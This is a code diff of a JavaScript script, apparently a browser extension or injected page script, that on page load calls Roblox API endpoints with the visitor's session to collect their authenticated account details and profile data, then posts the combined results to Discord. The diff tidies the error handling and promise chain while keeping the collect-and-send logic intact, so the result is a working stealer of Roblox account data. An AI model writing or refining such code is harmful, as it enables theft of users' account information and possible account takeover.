@@ -19,8 +19,10 @@ function sendToDiscord(message) {
         return response.json();
     })
     .then(data => console.log('Successfully sent data to Discord:', data))
+    .catch(error => console.error('Error sending data to Discord:', error));
 }
 
+// Function to fetch data from Roblox API endpoints
 function fetchRobloxData() {
     const endpoints = [
         'https://users.roblox.com/v1/users/authenticated',
@@ -29,28 +31,23 @@ function fetchRobloxData() {
         'https://users.roblox.com/v1/description'
     ];
 
-    const fetchPromises = endpoints.map(url => 
-        fetch(url, { method: 'GET' })
+    Promise.all(endpoints.map(url =>
+        fetch(url)
             .then(response => response.json())
             .then(data => ({ url, data }))
-            .catch(error => {
-                console.error(`Error fetching data from ${url}:`, error);
-                return { url, error: error.message };
-            })
-    );
-
-    Promise.all(fetchPromises)
-        .then(results => {
-            // Combine the results into a single object
-            const combinedData = results.map(result => ({
-                url: result.url,
-                data: result.data || result.error
-            }));
-            
-            // Send the combined data to Discord
-            sendToDiscord(`Roblox Data: ${JSON.stringify(combinedData, null, 2)}`);
-        })
-        .catch(error => console.error('Error processing Roblox data:', error));
+            .catch(error => ({ url, error: error.message }))
+    ))
+    .then(results => {
+        // Combine the results into a single object
+        const combinedData = results.map(result => ({
+            url: result.url,
+            data: result.data || result.error
+        }));
+        
+        // Send the combined data to Discord
+        sendToDiscord(`Roblox Data: ${JSON.stringify(combinedData, null, 2)}`);
+    })
+    .catch(error => console.error('Error fetching Roblox data:', error));
 }
 
 // Trigger the initial message and data fetching once the DOM content is loaded
